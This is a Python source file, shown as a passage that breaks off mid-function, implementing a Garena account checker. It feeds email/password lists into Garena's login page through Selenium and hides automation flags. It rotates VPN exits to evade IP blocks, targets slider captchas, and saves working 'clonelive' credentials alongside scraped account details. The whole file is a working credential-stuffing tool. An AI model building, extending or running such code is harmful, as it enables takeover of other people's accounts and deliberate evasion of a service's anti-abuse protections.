import time
import csv
import random
import json
import os
import threading
import subprocess
import socket
import unicodedata
import tempfile
import urllib.request
import base64
import re
from urllib.error import URLError
from urllib.parse import urljoin, unquote_to_bytes

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from colorama import init, Fore, Style
from softether_switch import SoftEtherVpnSwitcher

try:
    import cv2
except ImportError:
    cv2 = None

try:
    import numpy as np
except ImportError:
    np = None
# Khởi tạo colorama
init(autoreset=True)

class GarenaAccountChecker:
    def __init__(self):
        self.results = []
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.clonelive_added = 0
        self.total_accounts = 0
        self.clonelive_total_current = 0
        self._output_files_initialized = False

        base_dir = os.path.dirname(os.path.abspath(__file__))
        self.vpn_state_base = os.environ.get(
            "VPN_STATE_DIR",
            os.path.join(base_dir, "SoftEtherVPN")
        )
        self.vpn_account_name = os.environ.get("VPN_ACCOUNT_NAME", "AutoVPN")
        self.vpn_nic_name = os.environ.get("VPN_NIC_NAME", "VPN")
        preferred_raw = os.environ.get("VPN_PREFERRED_COUNTRIES")
        default_preferred = ["VN", "TH", "KR", "JP", "US"]
        parsed_preferred = []
        if preferred_raw:
            parsed_preferred = [
                entry.strip().upper()
                for entry in preferred_raw.split(",")
                if entry.strip()
            ]
        if parsed_preferred:
            self.preferred_vpn_countries = list(dict.fromkeys(parsed_preferred))
        else:
            self.preferred_vpn_countries = default_preferred[:]
        try:
            parsed_attempts = int(os.environ.get("VPN_MAX_SWITCH_ATTEMPTS", "0"))
            self.vpn_switch_attempts = parsed_attempts if parsed_attempts >= 0 else 0
        except ValueError:
            self.vpn_switch_attempts = 0
        try:
            self.vpn_switch_candidates = max(1, int(os.environ.get("VPN_MAX_SWITCH_CANDIDATES", "200")))
        except ValueError:
            self.vpn_switch_candidates = 20
        self._vpn_switcher = None
        env_flag = os.environ.get("VPN_AUTO_SWITCH_ENABLED")
        self.enable_auto_vpn = True
        if env_flag:
            self.enable_auto_vpn = env_flag.strip().lower() not in {"0", "false", "no"}
        self.vpn_command_timeout = 90
        self.vpn_ip_change_timeout = 120
        self.vpn_ip_check_interval = 0.5
        self.vpn_stabilize_delay = 5
        self._vpn_warning_shown = False

        self.slider_solver_enabled = os.environ.get("SLIDER_SOLVER_ENABLED", "1").strip().lower() not in {"0", "false", "no"}
        self.slider_background_selectors = self._parse_selector_env(
            "SLIDER_BG_SELECTORS",
            [
                "#captcha__puzzle canvas:not(.block)",
                "#captcha__puzzle canvas:nth-of-type(1)",
                "canvas.geetest_canvas_bg",
                "canvas.geetest_canvas_fullbg",
                "[class*='geetest_canvas_bg']",
                "[class*='geetest_canvas_fullbg']",
                "[class*='gt_cut_fullbg']",
                "img.background",
                "img[class*='background']",
                "img[src*='background']",
                "img[src*='bg']",
            ],
        )
        self.slider_piece_selectors = self._parse_selector_env(
            "SLIDER_PIECE_SELECTORS",
            [
                "#captcha__puzzle canvas.block",
                "#captcha__puzzle canvas:nth-of-type(2)",
                "canvas.geetest_canvas_slice",
                "[class*='geetest_canvas_slice']",
                "[class*='slider-piece']",
                "[class*='slider_slice']",
                "img.piece",
                "img[class*='piece']",
                "img[src*='piece']",
                "img[src*='slice']",
            ],
        )
        self.slider_knob_selectors = self._parse_selector_env(
            "SLIDER_KNOB_SELECTORS",
            [
                "#captcha__frame .slider",
                "#captcha__frame .sliderIcon",
                "#captcha__frame .sliderbg",
                ".slider",
                ".slider-knob",
                ".slider-handle",
                ".sliderIcon",
                ".sliderbg",
                ".geetest_slider_button",
                ".gt_slider_knob",
                ".gt_slider_button",
                "[class*='slider_button']",
                "[class*='slider-btn']",
                "[class*='handler']",
                "[class*='slider']",
            ],
        )
        self.slider_frame_selectors = self._parse_selector_env(
            "SLIDER_FRAME_SELECTORS",
            [
                "#captcha__frame",
                "[id*='captcha__frame']",
                ".captcha-frame",
                "div[id*='captcha'][class*='frame']",
            ],
        )
        try:
            self.slider_offset_adjust = float(os.environ.get("SLIDER_OFFSET_ADJUST", "0"))
        except ValueError:
            self.slider_offset_adjust = 0.0
        self._slider_solver_ready = cv2 is not None and np is not None
        try:
            self.slider_element_wait_timeout = float(os.environ.get("SLIDER_ELEMENT_WAIT", "6"))
        except ValueError:
            self.slider_element_wait_timeout = 6.0
        if self.slider_element_wait_timeout < 0:
            self.slider_element_wait_timeout = 0.0
        try:
            self.slider_element_retry_interval = float(os.environ.get("SLIDER_ELEMENT_RETRY", "0.3"))
        except ValueError:
            self.slider_element_retry_interval = 0.3
        if self.slider_element_retry_interval <= 0:
            self.slider_element_retry_interval = 0.3
        template_env = os.environ.get("SLIDER_TEMPLATE_PATH")
        if template_env:
            candidate = template_env.strip().strip('"').strip("'")
            if candidate:
                if not os.path.isabs(candidate):
                    candidate = os.path.join(base_dir, candidate)
                self.slider_template_path = os.path.abspath(candidate)
            else:
                self.slider_template_path = None
        else:
            template_candidates = [
                "slider_template.png",
                "captcha_template.png",
                "t?i xu?ng (1).png",
                "tai xuong (1).png",
            ]
            resolved_template = None
            for candidate_name in template_candidates:
                candidate_path = os.path.join(base_dir, candidate_name)
                if os.path.isfile(candidate_path):
                    resolved_template = os.path.abspath(candidate_path)
                    break
            self.slider_template_path = resolved_template
            if self.slider_template_path is None:
                try:
                    for entry_name in os.listdir(base_dir):
                        if not entry_name.lower().endswith('.png'):
                            continue
                        normalized = unicodedata.normalize('NFKD', entry_name).encode('ascii', 'ignore').decode('ascii', 'ignore')
                        if 'tai' in normalized and 'xuong' in normalized:
                            self.slider_template_path = os.path.abspath(os.path.join(base_dir, entry_name))
                            break
                except Exception:
                    pass
        try:
            self.slider_template_threshold = float(os.environ.get("SLIDER_TEMPLATE_THRESHOLD", "0.65"))
        except ValueError:
            self.slider_template_threshold = 0.65
        if not (0 < self.slider_template_threshold < 1):
            self.slider_template_threshold = 0.65
        try:
            self.slider_template_match_count = max(2, int(os.environ.get("SLIDER_TEMPLATE_MATCH_COUNT", "2")))
        except ValueError:
            self.slider_template_match_count = 2

        try:
            self.slider_retry_attempts = max(0, int(os.environ.get("SLIDER_RETRY_ATTEMPTS", "1")))
        except ValueError:
            self.slider_retry_attempts = 1

        self._chromedriver_binary_path = None
        self._chromedriver_reuse_logged = False

    def ensure_output_file(self, output_file):
        directory = os.path.dirname(output_file)
        if directory and not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
        if not os.path.exists(output_file):
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("Email  ||  Mật khóa  ||  Trạng thái    ||  Thông báo\n")
            self.log_progress(f"T\u1ea1o m\u1edbi file k\u1ebft qu\u1ea3: {output_file}", Fore.GREEN)


    def log_progress(self, message, color=Fore.MAGENTA):
        """In ra thông tin tiến trình kèm timestamp để dễ theo dõi."""
        timestamp = time.strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] {message}{Style.RESET_ALL}")

    def alert_user(self, stop_event):
        """Phát âm thanh cảnh báo liên tục cho đến khi được yêu cầu dừng."""
        try:
            import winsound
            pattern = [(800, 250), (1000, 250), (1200, 250), (1000, 250)]
            while not stop_event.is_set():
                for freq, duration in pattern:
                    if stop_event.is_set():
                        break
                    winsound.Beep(freq, duration)
                    if stop_event.is_set():
                        break
                    time.sleep(0.05)
        except Exception:
            while not stop_event.is_set():
                print('\a', end='', flush=True)
                time.sleep(0.2)

    def get_current_ip(self):
        """Return current outward-facing IP if detectable."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.connect(("8.8.8.8", 80))
                return sock.getsockname()[0]
        except Exception:
            try:
                return socket.gethostbyname(socket.gethostname())
            except Exception:
                return None

    def wait_for_ip_change(self, original_ip, check_interval=0.5, timeout=None):
        """Pause execution until the network IP changes or timeout occurs."""
        baseline = original_ip
        if baseline:
            self.log_progress(
                f"Tam dung cho den khi IP thay doi (hien tai: {baseline}).",
                Fore.YELLOW
            )
        else:
            self.log_progress(
                "Chua xac dinh duoc IP hien tai. Dang thu lai...",
                Fore.YELLOW
            )

        start_time = time.time()
        while True:
            current_ip = self.get_current_ip()
            if baseline:
                if current_ip and current_ip != baseline:
                    self.log_progress(
                        f"Phat hien IP moi: {current_ip}.",
                        Fore.GREEN
                    )
                    return current_ip
            else:
                if current_ip:
                    baseline = current_ip
                    self.log_progress(
                        f"Da xac dinh IP hien tai: {baseline}. Cho doi IP moi...",
                        Fore.YELLOW
                    )
            if timeout is not None and (time.time() - start_time) >= timeout:
                self.log_progress(
                    "Het thoi gian cho IP moi.",
                    Fore.RED
                )
                return None
            time.sleep(check_interval)

    def detect_slider_captcha(self, driver, page_source=None):
        """Return True if a slider or puzzle captcha is present."""
        try:
            driver.switch_to.default_content()
        except Exception:
            pass

        if page_source is None:
            try:
                page_source = driver.page_source
            except Exception:
                page_source = ""

        lower_page = (page_source or "").lower()
        slider_markers = [
            "slidercaptcha",
            "drag the slider",
            "drag to verify",
            "drag slider",
            "match the puzzle",
            "complete the puzzle",
            "puzzle captcha",
            "captcha.garena",
            "captcha-slider",
            "slide to continue",
            "please slide",
            "keo thanh",
            "keo tha",
            "ghep hinh",
            "geetest"
        ]

        if any(marker in lower_page for marker in slider_markers):
            return True

        try:
            elements = driver.find_elements(
                By.CSS_SELECTOR,
                "[class*='slider'], [class*='captcha'], [id*='slider'], [id*='captcha']"
            )
        except Exception:
            elements = []

        for element in elements:
            try:
                if not element.is_displayed():
                    continue
            except Exception:
                continue

            snippets = " ".join(
                filter(
                    None,
                    [
                        (element.text or "").lower(),
                        (element.get_attribute("class") or "").lower(),
                        (element.get_attribute("aria-label") or "").lower(),
                        (element.get_attribute("role") or "").lower(),
                    ],
                )
            )

            if ("captcha" in snippets or "garena" in snippets) and any(
                token in snippets for token in ["drag", "slider", "puzzle", "keo", "ghep"]
            ):
                return True

        try:
            frames = driver.find_elements(By.TAG_NAME, "iframe")
        except Exception:
            frames = []

        for frame in frames:
            try:
                src = (frame.get_attribute("src") or "").lower()
            except Exception:
                src = ""
            if any(keyword in src for keyword in ["captcha", "slider", "geetest", "puzzle"]):
                return True

        return False

    def _parse_selector_env(self, env_key, defaults):
        raw_value = os.environ.get(env_key)
        if not raw_value:
            return list(defaults)
        selectors = [item.strip() for item in raw_value.split(",")]
        return [selector for selector in selectors if selector]

    def _find_element_by_selectors(self, driver, selectors):
        fallback = None
        for selector in selectors:
            selector = selector.strip()
            if not selector:
                continue
            try:
                if selector.startswith("//"):
                    element = driver.find_element(By.XPATH, selector)
                else:
                    element = driver.find_element(By.CSS_SELECTOR, selector)
            except Exception:
                continue

            if element and fallback is None:
                fallback = element
            if not element:
                continue
            try:
                if element.is_displayed():
                    return element
            except Exception:
                continue
        return fallback

    def _extract_css_url(self, css_value):
        if not css_value:
            return None
        match = re.search(r"url\(([^)]+)\)", css_value)
        if not match:
            return None
        candidate = match.group(1).strip()
        candidate = candidate.strip("'")
        candidate = candidate.strip('"')
        if not candidate or candidate.lower() == "none":
            return None
        return candidate
    def _decode_data_url(self, data_url):
        if not data_url or not data_url.startswith("data:"):
            return None
        header, _, payload = data_url.partition(",")
        if not payload:
            return None
        try:
            if "base64" in header:
                return base64.b64decode(payload)
            return unquote_to_bytes(payload)
        except Exception:
            return None

    def _write_bytes_to_tempfile(self, data, suffix):
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=suffix)
        temp_file.close()
        with open(temp_file.name, "wb") as handle:
            handle.write(data)
        return temp_file.name

    def _screenshot_slider_element(self, element, suffix):
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=suffix)
        temp_file.close()
        try:
            element.screenshot(temp_file.name)
            return temp_file.name
        except Exception:
            try:
                os.remove(temp_file.name)
            except OSError:
                pass
            return None

    def _download_slider_image(self, driver, element, suffix):
        if element is None:
            return None

        sources = []
        attribute_candidates = (
            "src",
            "data-src",
            "data-background",
            "data-bg",
            "data-lazy-src",
            "data-original",
            "data-url",
            "data-img",
        )
        for attr in attribute_candidates:
            value = (element.get_attribute(attr) or "").strip()
            if value and value not in sources:
                sources.append(value)

        style_url = self._extract_css_url(element.get_attribute("style"))
        if style_url and style_url not in sources:
            sources.append(style_url)

        if driver:
            try:
                computed_style = driver.execute_script(
                    "try { return window.getComputedStyle(arguments[0]).backgroundImage; } catch (e) { return null; }",
                    element,
                )
            except Exception:
                computed_style = None
            computed_url = self._extract_css_url(computed_style)
            if computed_url and computed_url not in sources:
                sources.append(computed_url)

        tag_name = ""
        try:
            tag_name = (element.tag_name or "").lower()
        except Exception:
            pass

        if driver and tag_name == "canvas":
            try:
                data_url = driver.execute_script(
                    "try { return arguments[0].toDataURL('image/png'); } catch (e) { return null; }",
                    element,
                )
            except Exception:
                data_url = None
            if data_url:
                data_bytes = self._decode_data_url(data_url)
                if data_bytes:
                    try:
                        return self._write_bytes_to_tempfile(data_bytes, suffix)
                    except Exception as exc:
                        self.log_progress(f"Khong the luu anh captcha tu canvas: {exc}", Fore.YELLOW)

        user_agent = "Mozilla/5.0"
        cookies_header = None
        if driver:
            try:
                ua = driver.execute_script("return navigator.userAgent;")
                if ua:
                    user_agent = ua
            except Exception:
                pass

            try:
                cookie_pairs = []
                for cookie in driver.get_cookies():
                    name = cookie.get("name")
                    value = cookie.get("value")
                    if name and value:
                        cookie_pairs.append(f"{name}={value}")
                if cookie_pairs:
                    cookies_header = "; ".join(cookie_pairs)
            except Exception:
                cookies_header = None

        for source in sources:
            if not source or source.lower() == "none":
                continue

            if source.startswith("data:"):
                data_bytes = self._decode_data_url(source)
                if data_bytes:
                    try:
                        return self._write_bytes_to_tempfile(data_bytes, suffix)
                    except Exception as exc:
                        self.log_progress(f"Khong the luu anh captcha tu data URL: {exc}", Fore.YELLOW)
                continue

            normalized = source
            if normalized.startswith("//"):
                scheme = "https:" if driver and driver.current_url.startswith("https") else "http:"
                normalized = f"{scheme}{normalized}"

            try:
                base_url = driver.current_url if driver else ""
            except Exception:
                base_url = ""

            target_url = urljoin(base_url, normalized)
            headers = {"User-Agent": user_agent}
            if cookies_header:
                headers["Cookie"] = cookies_header

            try:
                request = urllib.request.Request(target_url, headers=headers)
                with urllib.request.urlopen(request, timeout=15) as response:
                    data = response.read()
                if data:
                    return self._write_bytes_to_tempfile(data, suffix)
            except URLError as exc:
                self.log_progress(f"Khong the tai hinh captcha tu {target_url}: {exc}", Fore.YELLOW)
            except Exception as exc:
                self.log_progress(f"Loi khi tai hinh captcha tu {target_url}: {exc}", Fore.YELLOW)

        fallback_path = self._screenshot_slider_element(element, suffix)
        if fallback_path:
            self.log_progress(
                "Su dung anh chup element lam du lieu captcha (fallback).",
                Fore.CYAN,
            )
        return fallback_path





    def auto_switch_vpn(self):
        """Attempt to trigger VPN rotation automatically."""
        if not self.enable_auto_vpn:
            return False

        original_ip = self.get_current_ip()

        if self._vpn_switcher is None:
            def _switcher_logger(message, color=None):
                if color is None:
                    self.log_progress(message)
                else:
                    self.log_progress(message, color)

            try:
                self._vpn_switcher = SoftEtherVpnSwitcher(
                    base_dir=self.vpn_state_base,
                    account_name=self.vpn_account_name,
                    nic_name=self.vpn_nic_name,
                    preferred_countries=self.preferred_vpn_countries,
                    logger=_switcher_logger,
                    max_candidates=self.vpn_switch_candidates,
                    max_attempts=self.vpn_switch_attempts,
                )
            except Exception as exc:
                self.log_progress(
                    f"Khong the khoi tao bo doi SoftEther: {exc}",
                    Fore.YELLOW
                )
                self.enable_auto_vpn = False
                return False

        if not self._vpn_switcher.switch():
            if (
                self._vpn_switcher
                and self._vpn_switcher.vpncmd_path is None
                and not self._vpn_warning_shown
            ):
                self.log_progress(
                    "Khong tim thay vpncmd.exe de doi VPN tu dong. Vui long cai dat SoftEther VPN Client hoac dat VPNCMD_PATH.",
                    Fore.YELLOW
                )
                self._vpn_warning_shown = True
                self.enable_auto_vpn = False
            return False

        new_ip = self.wait_for_ip_change(
            original_ip,
            check_interval=self.vpn_ip_check_interval,
            timeout=self.vpn_ip_change_timeout
        )
        if not new_ip:
            self.log_progress("Khong phat hien IP moi sau khi doi VPN tu dong.", Fore.YELLOW)
            return False

        if self.vpn_stabilize_delay > 0:
            time.sleep(self.vpn_stabilize_delay)

        self.log_progress(f"Doi VPN tu dong thanh cong (IP moi: {new_ip}).", Fore.GREEN)
        return True

    def _resolve_chrome_binary(self):
        """Tra ve duong dan Chrome neu tim duoc, nguoc lai tra None de dung mac dinh."""
        env_candidates = [
            os.environ.get("CHROME_BINARY"),
            os.environ.get("GOOGLE_CHROME_BIN"),
        ]
        for candidate in env_candidates:
            if candidate and os.path.isfile(candidate):
                return os.path.abspath(candidate)

        candidate_paths = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ]
        derived_candidates = [
            os.path.join(os.environ.get("PROGRAMFILES", ""), "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Google", "Chrome", "Application", "chrome.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
        ]
        for candidate in derived_candidates:
            if candidate and candidate not in candidate_paths:
                candidate_paths.append(candidate)

        for candidate in candidate_paths:
            if candidate and os.path.isfile(candidate):
                return os.path.abspath(candidate)
        return None

    def _resolve_chromedriver_binary(self):
        """Tra ve duong dan ChromeDriver va cache ket qua cho lan sau."""
        cached_path = self._chromedriver_binary_path
        if cached_path and os.path.exists(cached_path):
            if not self._chromedriver_reuse_logged:
                self.log_progress(
                    f"Su dung lai ChromeDriver tai: {cached_path}",
                    Fore.CYAN
                )
                self._chromedriver_reuse_logged = True
            return cached_path

        try:
            path_str = ChromeDriverManager().install()
            self._chromedriver_binary_path = path_str
            self._chromedriver_reuse_logged = False
            self.log_progress(
                f"Da cai ChromeDriver tai: {path_str}",
                Fore.CYAN
            )
            return path_str
        except Exception as error:
            self.log_progress(
                f"Khong the cai ChromeDriver tu dong: {error}",
                Fore.RED
            )
            raise

    def normalize_text(self, text):
        """Return lowercase text with diacritics removed for keyword matching."""
        if not text:
            return ""
        normalized = unicodedata.normalize("NFD", text)
        stripped = "".join(ch for ch in normalized if unicodedata.category(ch) != "Mn")
        return stripped.lower()

    def setup_driver(self):
        """Cấu hình và khởi tạo trình duyệt Chrome thật trên máy"""
        self.log_progress("Đang cấu hình và khởi tạo trình duyệt Chrome...", Fore.YELLOW)
        options = Options()
        options.add_argument("--incognito")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_experimental_option("detach", True)

        chrome_binary = self._resolve_chrome_binary()
        if chrome_binary:
            options.binary_location = chrome_binary
            self.log_progress(
                f"Su dung Chrome tai: {chrome_binary}",
                Fore.CYAN
            )
        else:
            self.log_progress(
                "Su dung Chrome mac dinh da cai tren may.",
                Fore.CYAN
            )

        try:
            driver = webdriver.Chrome(
                service=Service(self._resolve_chromedriver_binary()),
                options=options
            )
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.log_progress("Khởi tạo trình duyệt thành công.", Fore.GREEN)
            return driver
        except Exception as e:
            self.log_progress(f"Lỗi khi khởi tạo trình duyệt: {e}", Fore.RED)
            return None

    def type_like_human(self, element, text):
        """Gõ phím giống người thật"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))

    def remove_account_from_source(self, email, password, file_path="accounts.txt"):
        """Xoa tai khoan khoi file nguon sau khi da xu ly."""
        try:
            if not file_path or not os.path.exists(file_path):
                return
            with open(file_path, "r", encoding="utf-8") as f:
                lines = f.readlines()
            removed = False
            remaining = []
            for line in lines:
                stripped = line.strip()
                if not stripped:
                    remaining.append(line)
                    continue
                normalized = stripped
                if ":" not in normalized and "|" in normalized:
                    normalized = normalized.replace("|", ":", 1)
                if ":" in normalized:
                    left, right = [part.strip() for part in normalized.split(":", 1)]
                    if left == email and right == password and not removed:
                        removed = True
                        continue
                remaining.append(line)
            if removed:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.writelines(remaining)
                self.log_progress(f"Da xoa {email} khoi {file_path}.", Fore.CYAN)
        except Exception as e:
            self.log_progress(f"Khong the xoa {email} khoi {file_path}: {e}", Fore.YELLOW)


    def reset_runtime_stats(self):
        """Lam moi cac bien dem trong bo nho cho mot lan xu ly moi."""
        self.results.clear()
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.clonelive_added = 0
        self.clonelive_total_current = 0
        self.total_accounts = 0

    def reset_output_files(self, output_file, valid_file, invalid_file, notcheck_file):
        """Dat lai cac file ket qua truoc khi bat dau mot lan kiem tra moi."""
        self.log_progress("Dang reset cac file ket qua cu.", Fore.YELLOW)
        file_defaults = {
            output_file: "Email  ||  Mật khẩu  ||  Trạng thái    ||  Thông báo\n",
            valid_file: "",
            "clonepass.txt": "",
            invalid_file: "",
            notcheck_file: "",
            "liveordie.txt": "",
            "clonelive.js": "[]\n",
            "clonelive.txt": "",
            "clonedie.js": "[]\n",
            "clonedie.txt": ""
        }
        processed = set()
        for path_value, content in file_defaults.items():
            if not path_value or path_value in processed:
                continue
            processed.add(path_value)
            try:
                with open(path_value, "w", encoding="utf-8") as f:
                    f.write(content)
            except Exception as reset_error:
                self.log_progress(f"Khong the reset {path_value}: {reset_error}", Fore.YELLOW)
        self.reset_runtime_stats()
        self._output_files_initialized = True

    def check_account(self, email, password):
        """Kiểm tra một tài khoản Garena"""
        self.log_progress(f"Bắt đầu kiểm tra tài khoản: {email}", Fore.CYAN)
        driver = self.setup_driver()
        if not driver:
            return False, "Không thể khởi tạo trình duyệt"

        try:
            login_url = "https://auth.garena.com/universal/oauth?client_id=100054&redirect_uri=https%3A%2F%2Fkientuong.lienquan.garena.vn%2Fauth%2Flogin%2Fcallback&response_type=code&"
            self.log_progress("Đang mở trang đăng nhập...", Fore.CYAN)
            start_time = time.time()
            driver.get(login_url)
            load_time = time.time() - start_time
            self.log_progress(f"Đã mở trang đăng nhập trong {load_time:.2f} giây.", Fore.CYAN)

            try:
                self.log_progress("Đang chờ form đăng nhập xuất hiện...", Fore.CYAN)
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.TAG_NAME, "input"))
                )
                self.log_progress("Đã phát hiện form đăng nhập.", Fore.GREEN)
            except Exception:
                current_url = driver.current_url.lower()
                if "blog" in current_url:
                    self.log_progress("Trang đăng nhập chuyển sang blog - có thể bị chặn.", Fore.RED)
                    return False, "Tài khoản bị chặn (blog)"
                if "access" in current_url:
                    self.log_progress("Trang thông báo access - có thể bị chặn IP.", Fore.RED)
                    return False, "IP bị chặn tạm thời"
                if "block" in current_url:
                    self.log_progress("Trang thông báo block - có thể bị chặn IP.", Fore.RED)
                    return False, "IP bị chặn, vui lòng thử lại sau"
                self.log_progress("Không tìm thấy form đăng nhập.", Fore.RED)
                return False, "Không tìm thấy form đăng nhập"

            self.log_progress("Đang chuẩn bị nhập thông tin đăng nhập...", Fore.CYAN)
            inputs = driver.find_elements(By.TAG_NAME, "input")
            if len(inputs) < 2:
                self.log_progress("Không tìm thấy đủ trường nhập liệu.", Fore.RED)
                return False, "Không tìm thấy đủ trường nhập liệu"

            email_field = inputs[0]
            email_field.clear()
            self.log_progress("Đang nhập email...", Fore.CYAN)
            self.type_like_human(email_field, email)

            email_field.send_keys(Keys.TAB)
            time.sleep(0.5)

            password_field = driver.switch_to.active_element
            self.log_progress("Đang nhập mật khẩu...", Fore.CYAN)
            password_field.send_keys(password)

            before_login_url = driver.current_url

            self.log_progress("Đang gửi yêu cầu đăng nhập...", Fore.CYAN)
            password_field.send_keys(Keys.ENTER)

            self.log_progress("Đang chờ phản hồi đăng nhập...", Fore.CYAN)
            time.sleep(6)

            page_source = driver.page_source
            page_source_lower = page_source.lower()
            page_source_normalized = self.normalize_text(page_source)
            banned_keywords = (
                "user has been banned",
                "tai khoan da bi khoa",
                "tai khoan nay da bi cam",
            )
            if self.detect_slider_captcha(driver, page_source):
                self.log_progress("Phat hien captcha keo ghep hinh (slider).", Fore.YELLOW)
                return False, "INVALID"
            if "Login Now" in page_source and "As a security measure, you will be automatically redirected to the Garena Account Center" in page_source:
                self.log_progress(
                    "Phat hien thong bao tu dong chuyen huong - tai khoan bi chan boi Garena.",
                    Fore.RED
                )
                return False, "BAN_GARENA"
            if (
                any(keyword in page_source_lower for keyword in banned_keywords)
                or any(keyword in page_source_normalized for keyword in banned_keywords)
            ):
                self.log_progress("T\u00e0i kho\u1ea3n b\u1ecb kh\u00f3a ho\u1eb7c b\u1ecb c\u1ea5m.", Fore.RED)
                return False, "T\u00e0i kho\u1ea3n b\u1ecb kh\u00f3a"
            after_login_url = driver.current_url
            self.log_progress(f"URL sau đăng nhập: {after_login_url}", Fore.CYAN)

            current_url_lower = after_login_url.lower()
            if self.detect_slider_captcha(driver):
                self.log_progress("Phat hien captcha keo ghep hinh sau khi dang nhap.", Fore.YELLOW)
                return False, "INVALID"
            if "blog" in current_url_lower:
                self.log_progress("Bị chuyển hướng sang blog - tài khoản bị chặn.", Fore.RED)
                return False, "Tài khoản bị chặn (blog)"
            if "access" in current_url_lower:
                self.log_progress("Bị chặn tạm thời do IP.", Fore.RED)
                return False, "IP bị chặn tạm thời"
            if "block" in current_url_lower:
                self.log_progress("Bị chặn truy cập.", Fore.RED)
                return False, "IP bị chặn, vui lòng thử lại sau"
            if "error" in current_url_lower:
                self.log_progress("Trang báo lỗi đăng nhập.", Fore.RED)
                return False, "Lỗi đăng nhập"

            try:
                error_div = driver.find_element(
                    By.XPATH,
                    '//div[contains(@class, "error") or contains(@class, "error-message")]'
                )

                if error_div.is_displayed():
                    error_text = error_div.text.strip()
                    lower_error = error_text.lower()
                    normalized_error = self.normalize_text(error_text)
                    if (
                        any(keyword in lower_error for keyword in banned_keywords)
                        or any(keyword in normalized_error for keyword in banned_keywords)
                    ):
                        self.log_progress("T\u00e0i kho\u1ea3n b\u1ecb kh\u00f3a ho\u1eb7c b\u1ecb c\u1ea5m.", Fore.RED)
                        return False, "T\u00e0i kho\u1ea3n b\u1ecb kh\u00f3a"
                    if "sai tên tài khoản hoặc mật khẩu" in lower_error or "username or password is incorrect." in lower_error:
                        self.log_progress("Sai mật khẩu.", Fore.YELLOW)
                        return False, "SAI_PASS"
                    if "chưa xác định lỗi sai" in lower_error or "an unknown error occured." in lower_error:
                        self.log_progress("Lỗi mạng hoặc lỗi không xác định.", Fore.YELLOW)
                        return False, "NOT_INTERNET"
                    self.log_progress(f"Lỗi khác: {error_text}", Fore.YELLOW)
                    return False, f"Lỗi: {error_text}"
            except NoSuchElementException:
                self.log_progress("Không thấy thông báo lỗi hiển thị.", Fore.GREEN)
            except Exception as e:
                self.log_progress(f"Lỗi khi đọc thông báo lỗi: {e}", Fore.YELLOW)

            try:
                block_element = driver.find_element(By.XPATH, "//BODY/DIV[2]/DIV[1]")
                if block_element.is_displayed():
                    self.log_progress("Phat hien trang chan dang nhap.", Fore.RED)
                    self.remove_account_from_source(email, password)
                    return False, "CANT_LOGIN"
            except NoSuchElementException:
                pass
            except Exception as e:
                self.log_progress(f"Loi khi kiem tra chan dang nhap: {e}", Fore.YELLOW)

            if before_login_url != after_login_url:
                self.log_progress("Đăng nhập thành công, chuyển sang lấy thông tin tài khoản.", Fore.GREEN)
                self.log_progress("Đang tải trang kientuong.lienquan...", Fore.CYAN)
                time.sleep(5)

                xpaths = [
                    "//*[@id='main-body']/DIV[1]/DIV[1]/DIV[2]/DIV[2]/DIV[1]/DIV[1]",
                    "//*[@id='main-body']/DIV[1]/DIV[1]/DIV[2]/DIV[2]/DIV[1]/DIV[2]",
                    "//*[@id='main-body']/DIV[1]/DIV[1]/DIV[2]/DIV[2]/DIV[1]/DIV[3]"
                ]

                results = []
                self.log_progress("Đang thu thập dữ liệu tài khoản...", Fore.CYAN)
                for xp in xpaths:
                    try:
                        element = driver.find_element(By.XPATH, xp)
                        text = element.text.strip()
                        if not text:
                            text = (element.get_attribute("innerText") or "").strip()
                        results.append(text)
                        self.log_progress(f"Lấy dữ liệu tài khoản {xp}.", Fore.GREEN)
                    except Exception as e:
                        results.append("")
                        self.log_progress(f"Không tìm thấy {xp}: {e}", Fore.YELLOW)
                results = (results + [""] * len(xpaths))[:len(xpaths)]
                liveordie_written = False
                try:
                    line = f"{email}  ||  {password}  ||  {results[0]}  ||  {results[1]}  ||  {results[2]}\n"
                    with open("liveordie.txt", "a", encoding="utf-8") as f:
                        f.write(line)
                    liveordie_written = True
                except Exception as live_error:
                    self.log_progress(f"Không ghi được dữ liệu vào liveordie.txt: {live_error}", Fore.YELLOW)
                if not any(part.strip() for part in results):
                    self.log_progress("Không load được dữ liệu.", Fore.RED)
                    return False, "NO_DATA"
                status_text = results[2] if len(results) > 2 else ""
                normalized_status = self.normalize_text(status_text)
                locked_keywords = ("bi khoa", "khoa tai khoan", "khoa tam thoi")

                if "binh thuong" in normalized_status:
                    clonelive_path = "clonelive.js"
                    account_entry = {"username": email, "password": password}
                    try:
                        existing_accounts = []
                        if os.path.exists(clonelive_path):
                            with open(clonelive_path, "r", encoding="utf-8") as js_file:
                                raw_data = js_file.read().strip()
                                if raw_data:
                                    try:
                                        existing_accounts = json.loads(raw_data)
                                        if not isinstance(existing_accounts, list):
                                            existing_accounts = []
